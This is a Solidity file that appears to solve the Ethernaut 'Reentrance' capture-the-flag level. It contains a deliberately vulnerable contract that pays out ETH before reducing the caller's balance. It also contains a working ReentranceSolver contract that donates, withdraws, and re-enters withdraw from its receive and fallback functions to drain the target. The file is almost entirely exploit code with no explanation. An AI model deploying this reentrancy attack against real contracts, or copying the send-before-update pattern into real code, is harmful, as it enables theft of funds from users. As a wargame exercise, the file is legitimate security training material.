// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract Reentrance {
    // using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentranceSolver {
    Reentrance public s_reentrance;

    constructor(address payable reentranceAddress) public {
        s_reentrance = Reentrance(reentranceAddress);
    }

    function attack() public payable {
        require(msg.value == 0.001 * 1e18, "Not enough ETH");
        s_reentrance.donate{value: 0.001 * 1e18}(address(this));
        s_reentrance.withdraw(0.001 * 1e18);
    }

    receive() external payable {
        if (address(s_reentrance).balance >= 0.001 * 1e18) {
            s_reentrance.withdraw(0.001 * 1e18);
        }
    }

    fallback() external payable {
        if (address(s_reentrance).balance >= 0.001 * 1e18) {
            s_reentrance.withdraw(0.001 * 1e18);
        }
    }
}
